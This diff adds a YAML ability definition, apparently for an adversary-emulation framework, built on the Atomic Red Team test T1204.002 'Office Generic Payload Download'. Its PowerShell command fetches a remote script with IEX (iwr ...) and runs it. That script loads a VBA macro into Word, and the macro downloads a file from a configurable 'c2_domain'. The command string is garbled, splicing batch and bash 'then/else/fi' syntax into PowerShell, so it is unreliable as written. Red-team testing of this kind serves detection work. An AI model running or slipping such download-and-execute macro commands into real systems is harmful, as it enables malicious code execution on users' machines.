@@ -1,0 +1,111 @@
+- id: 5202ee05-c420-4148-bf5e-fd7f7d24850c
+  name: Office Generic Payload Download
+  description: 'This Test uses a VBA macro to launch Powershell which will download
+    a file from a user defined web server.
+
+    Required input agruments are c2_domain and file_name
+
+    Execution is handled by [Invoke-MalDoc](https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1)
+    to load and execute VBA code into Excel or Word documents.
+
+    Example for c2 server located at 127.0.0.1 for the file test.txt which is nested
+    below the parent directory in the tests/my-test folder
+
+    Example input args for file in root directory c2-domain = 127.0.0.1, file-name
+    = test.txt'
+  tactic: execution
+  technique:
+    attack_id: T1204.002
+    name: 'User Execution: Malicious File'
+  platforms:
+    windows:
+      psh:
+        command: 'if (#{c2_domain}) (exit 0) else (exit 1); then : ; else Write-Host
+          "Destination c2 server domain name or IP address must be set and reachable
+          for HTTP service"; fi; try {; New-Object -COMObject "Word.Application" |
+          Out-Null; $process = "Word"; then : ; else Write-Host "You will need to
+          install Microsoft Word manually to meet this requirement"; fi; [Net.ServicePointManager]::SecurityProtocol
+          = [Net.SecurityProtocolType]::Tls12; IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1"
+          -UseBasicParsing); $macroCode = Get-Content "test9-GenericPayloadDownload.txt"
+          -Raw; $URL = "#{c2_domain}" + "/" + "#{c2_parent_directory}"; $macroCode
+          = $macroCode -replace ''serverPath'', $URL -replace ''fileName'', "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/test9-example-payload.txt";
+          Invoke-MalDoc -macroCode $macroCode -officeProduct "Word"'
+        cleanup: Remove-Item "C:\Users\$env:username\Desktop\#{file_name}" -ErrorAction
+          Ignore
+  plugin: atomic
+  singleton: false
+  repeatable: true
+  delete_payload: false
+  privilege: ''
+  buckets:
+  - execution
+  - t1204.002
+  - atomic-red-team
+  author: Atomic Red Team
+  additional_info:
+    input_arguments:
+      macro_path:
+        description: 'Location of file which will be converted to a VBA macro
+
+          '
+        type: path
+        default: PathToAtomicsFolder/T1204.002/src/test9-GenericPayloadDownload.txt
+      c2_domain:
+        description: 'This required variable points to a user defined HTTP server
+          that will host the file_name in the c2_parent_directory.
+
+          '
+        type: url
+        default: null
+      c2_parent_directory:
+        description: 'Parent directory where you have the "malicious" file on c2_domain
+          server.
+
+          Will default to root directory. Forward slashes are not needed at begining
+          or ending of directory path
+
+          '
+        type: path
+        default: ''
+      file_name:
+        description: '"Malicious" file to be downloaded.
+
+          This required file needs to be place on the user provided c2 domain
+
+          Example file can be found at PathToAtomicsFolder/T1204.002/src/test9-example-payload.txt
+
+          '
+        type: string
+        default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/test9-example-payload.txt
+      ms_product:
+        description: 'Maldoc application Word or Excel
+
+          '
+        type: string
+        default: Word
+    dependencies:
+    - description: 'Destination c2_domain name or IP address must be set to a running
+        HTTP server.
+
+        '
+      prereq_command: 'if (#{c2_domain}) (exit 0) else (exit 1)
+
+        '
+      get_prereq_command: 'Write-Host "Destination c2 server domain name or IP address
+        must be set and reachable for HTTP service"
+
+        '
+    - description: 'Microsoftt #{ms_product} must be installed
+
+        '
+      prereq_command: "try {\n  New-Object -COMObject \"#{ms_product}.Application\"\
+        \ | Out-Null\n  $process = \"#{ms_product}\"; if ( $process -eq \"Word\")\
+        \ {$process = \"winword\"}\n  Stop-Process -Name $process\n  exit 0\n} catch\
+        \ { exit 1 }\n"
+      get_prereq_command: 'Write-Host "You will need to install Microsoft #{ms_product}
+        manually to meet this requirement"
+
+        '
+    technique_created: '2020-03-11T14:49:36.954Z'
+    atomic_guid: 5202ee05-c420-4148-bf5e-fd7f7d24850c
+    import_timestamp: '2025-06-24T11:15:03.137098Z'
